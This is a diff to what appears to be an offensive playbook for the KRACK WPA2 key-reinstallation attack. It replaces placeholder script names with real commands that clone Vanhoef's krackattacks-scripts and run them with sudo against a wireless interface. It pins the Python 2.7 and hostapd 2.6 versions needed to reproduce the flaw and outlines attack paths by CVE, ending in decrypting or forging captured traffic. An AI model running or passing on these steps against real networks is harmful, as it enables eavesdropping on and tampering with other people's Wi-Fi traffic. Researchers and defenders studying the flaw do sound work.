@@ -28,16 +28,28 @@ airodump-ng -c <original-channel> --bssid AA:BB:CC:DD:EE:FF \
 
 # 3. Once M3 is captured, block the M4 ACK to the AP and replay
 #    M3 to the client.
-python3 krack-poc-vanhoef.py --ap AA:BB:CC:DD:EE:FF \
-                             --client 11:22:33:44:55:66
+git clone https://github.com/vanhoefm/krackattacks-scripts
+cd krackattacks-scripts/krackattack
+# The tool is Python 2.7 + hostapd 2.6 branch. See below.
+sudo python2 krack-test-client.py --interface wlan1
 
 # 4. Client reinstalls PTK; nonce counter resets.
 # 5. From this point, captured data frames can be decrypted or
 #    forged, depending on cipher (CCMP = decrypt; GCMP = forge).
 ```
 
-Vanhoef's `krackattacks-scripts` (2017 PoC repo) is the canonical
-tool. It automates the MC-MitM channel selection and M3 replay.
+Vanhoef's `krackattacks-scripts`
+(https://github.com/vanhoefm/krackattacks-scripts) is the canonical
+tool. It ships two scripts: `krack-test-client.py` (client-side
+reinstall tester + attack) and `krack-all-zero-tk.py` (specifically
+triggers the wpa_supplicant all-zero TK path).
+
+**Version pin — non-negotiable:** the scripts run on **Python 2.7**
+against the vendored **hostapd 2.6** branch with the KRACK patches
+applied. The upstream README documents this explicitly; newer hostapd
+branches deliberately do not reproduce the vulnerable retransmit
+behavior. Kali maintains a working fork; if you're on modern Python,
+you're not running the real tool.
 
 ## Path B — Linux/Android all-zero PTK special case (CVE-2017-13077 + wpa_supplicant ≤ 2.6)
 
@@ -67,7 +79,11 @@ reassoc lets the attacker force nonce reuse on the AP side.
 # 1. Identify FT-capable AP (MDE in beacon).
 # 2. Wait for or force a natural roam.
 # 3. Capture the reassoc; replay it.
-python3 krack-ft-reassoc.py --ap AA:BB:CC:DD:EE:FF ...
+# The FT variant is exercised through the same krackattacks-scripts
+# repo (python2 + hostapd 2.6). krack-test-client.py has an FT mode
+# selected via --group / interactive prompt; there is no separate
+# krack-ft binary.
+sudo python2 krack-test-client.py --interface wlan1
 ```
 
 ## Path D — Group-key reinstall (CVE-2017-13080, 13081)
@@ -85,8 +101,10 @@ Enables replay of broadcast frames for the affected group.
 - **PMF-required target.** M3 replay is protected. KRACK reduces to
   the FT/WNM variants (13082, 13087, 13088) — narrower vulnerable
   population.
-- **Vanhoef's PoC repo depends on old python2 / hostapd branch.**
-  Kali maintains a working fork; check pinned versions.
+- **Vanhoef's PoC repo depends on Python 2.7 + hostapd 2.6 branch.**
+  The upstream README pins these versions explicitly. Newer hostapd
+  branches remove the retransmit-on-timeout behavior the exploit
+  requires. Kali maintains a working fork.
 
 ## 2026-target expectations
 
